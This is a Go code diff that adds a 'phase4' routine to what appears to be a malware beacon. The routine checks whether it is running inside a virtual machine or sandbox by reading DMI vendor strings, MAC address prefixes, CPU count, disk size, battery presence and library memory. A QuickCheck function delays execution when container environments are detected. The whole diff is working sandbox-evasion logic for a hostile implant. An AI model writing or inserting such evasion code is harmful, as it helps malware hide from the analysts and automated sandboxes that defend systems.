@@ -293,6 +293,143 @@ func phase3(p *beacon.TargetProfile) {
 	}
 }
 
+// phase4 detects VM and sandbox environments.
+func phase4(p *beacon.TargetProfile) {
+	// DMI product name check
+	if b, _ := os.ReadFile("/sys/class/dmi/id/product_name"); len(b) > 0 {
+		name := strings.ToLower(strings.TrimSpace(string(b)))
+		vmVendors := map[string]string{
+			"virtualbox":               "VirtualBox",
+			"vmware":                   "VMware",
+			"vmware virtual platform":  "VMware",
+			"kvm":                      "KVM",
+			"qemu":                     "QEMU",
+			"standard pc":              "QEMU",
+			"bochs":                    "Bochs",
+			"parallels":                "Parallels",
+			"prl":                      "Parallels",
+			"xen":                      "Xen",
+		}
+		for substr, vendor := range vmVendors {
+			if strings.Contains(name, substr) {
+				p.IsVM = true
+				p.VMVendor = vendor
+				break
+			}
+		}
+	}
+
+	// MAC vendor check on primary interface
+	var bMac []byte
+	if bMac, _ = os.ReadFile("/sys/class/net/eth0/address"); len(bMac) == 0 {
+		if bMac, _ = os.ReadFile("/sys/class/net/enp0s3/address"); len(bMac) == 0 {
+			if bMac, _ = os.ReadFile("/sys/class/net/ens33/address"); len(bMac) == 0 {
+				entries, _ := os.ReadDir("/sys/class/net")
+				for _, e := range entries {
+					if e.Name() == "lo" {
+						continue
+					}
+					bMac, _ = os.ReadFile("/sys/class/net/" + e.Name() + "/address")
+					if len(bMac) > 0 {
+						break
+					}
+				}
+			}
+		}
+	}
+	if len(bMac) > 0 {
+		mac := strings.ToLower(strings.TrimSpace(string(bMac)))
+		macPrefixes := map[string]string{
+			"08:00:27": "VirtualBox",
+			"00:50:56": "VMware",
+			"00:0c:29": "VMware",
+			"00:05:69": "VMware",
+			"00:1c:42": "Parallels",
+			"00:15:5d": "Hyper-V",
+			"00:03:ff": "Microsoft Hyper-V",
+			"00:1c:14": "VMware",
+		}
+		for prefix, vendor := range macPrefixes {
+			if strings.HasPrefix(mac, prefix) {
+				if !p.IsVM {
+					p.IsVM = true
+					p.VMVendor = vendor
+				}
+				break
+			}
+		}
+	}
+
+	// CPU count
+	if b, _ := os.ReadFile("/proc/cpuinfo"); len(b) > 0 {
+		count := 0
+		for _, line := range strings.Split(string(b), "\n") {
+			if strings.HasPrefix(line, "processor") {
+				count++
+			}
+		}
+		p.CPUCount = count
+		if count < 2 {
+			p.IsSandbox = true
+			p.Hints = append(p.Hints, fmt.Sprintf("low cpu count: %d", count))
+		}
+	}
+
+	// Disk size
+	if b, _ := os.ReadFile("/proc/partitions"); len(b) > 0 {
+		for _, line := range strings.Split(string(b), "\n") {
+			fields := strings.Fields(line)
+			if len(fields) == 4 && (fields[3] == "sda" || fields[3] == "nvme0n1" || fields[3] == "vda") {
+				var blocks int64
+				fmt.Sscanf(fields[2], "%d", &blocks)
+				gb := blocks / 1024 / 1024 * 1 // blocks are 1KB on Linux
+				p.DiskSizeGB = gb
+				if gb < 100 {
+					p.Hints = append(p.Hints, fmt.Sprintf("small disk: %dGB", gb))
+				}
+				break
+			}
+		}
+	}
+
+	// Battery check
+	p.HasBattery = true
+	if b, _ := os.ReadFile("/sys/class/power_supply/BAT0/type"); len(b) == 0 {
+		if b, _ = os.ReadFile("/sys/class/power_supply/BAT1/type"); len(b) == 0 {
+			p.HasBattery = false
+		}
+	}
+	if !p.HasBattery {
+		entries, _ := os.ReadDir("/sys/class/power_supply")
+		for _, e := range entries {
+			if strings.HasPrefix(e.Name(), "BAT") {
+				p.HasBattery = true
+				break
+			}
+		}
+	}
+	if !p.HasBattery && !p.IsVM {
+		// Desktops also lack batteries, but combined with other indicators it's suggestive
+		p.Hints = append(p.Hints, "no battery detected")
+	}
+
+	// Additional sandbox indicators
+	if b, _ := os.ReadFile("/proc/self/status"); len(b) > 0 {
+		if strings.Contains(string(b), "VmLib") {
+			for _, line := range strings.Split(string(b), "\n") {
+				if strings.HasPrefix(line, "VmLib") {
+					var size int64
+					fmt.Sscanf(line, "VmLib: %d kB", &size)
+					if size < 500 {
+						p.Hints = append(p.Hints, "low library memory — possible sandbox")
+					}
+					break
+				}
+			}
+		}
+	}
+}
+
 func QuickCheck() (threatLevel string, initialDelay time.Duration) {
 	if os.Getenv("DOCKER_HOST") != "" || os.Getenv("KUBERNETES_SERVICE_HOST") != "" {
 		return "medium", 90 * time.Second
